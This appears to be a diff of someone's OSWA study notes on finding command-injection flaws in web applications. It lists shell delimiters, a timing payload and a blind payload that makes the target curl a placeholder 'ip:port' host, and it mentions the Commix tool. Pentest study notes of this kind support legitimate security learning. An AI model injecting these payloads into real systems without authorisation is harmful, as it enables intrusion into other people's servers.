@@ -130,11 +130,12 @@ This is a condensed version of the notes I used during OSWA and are by no means 
   - Making backups
   - Anything using non-web protocols
 - Determine if we can view the response to any injection attempt, if not test for blind command injection  
-- Manually test by entering payloads into potentially vulnerable fields
-  - Try delimeters (|| && ; \n) and see if there are errors produced.
+- Manually test by entering payloads into potentially vulnerable fields, observe the responses closely for clues of Command Injection. 
+  - Try delimeters (|| && ; \n) and see if there are errors produced. Can you chain additional commands after the delimeter and observe the output. 
   - Try blind injection payloads such as
 ```bash
 ;time+20;
 ;curl+http://ip:port/path;
 ```
-- Commix is a tool than can automate the finding of Command Injection vulnerabilities, very similar to SQLMap and easy to use. Basic usage can be seen below but read the docs for more control. 
+- Commix is a tool than can automate the finding of Command Injection vulnerabilities, very similar to SQLMap and easy to use. Basic usage can be seen below but read the docs for more control.
+- Use other automated tools to discover Command Injection:
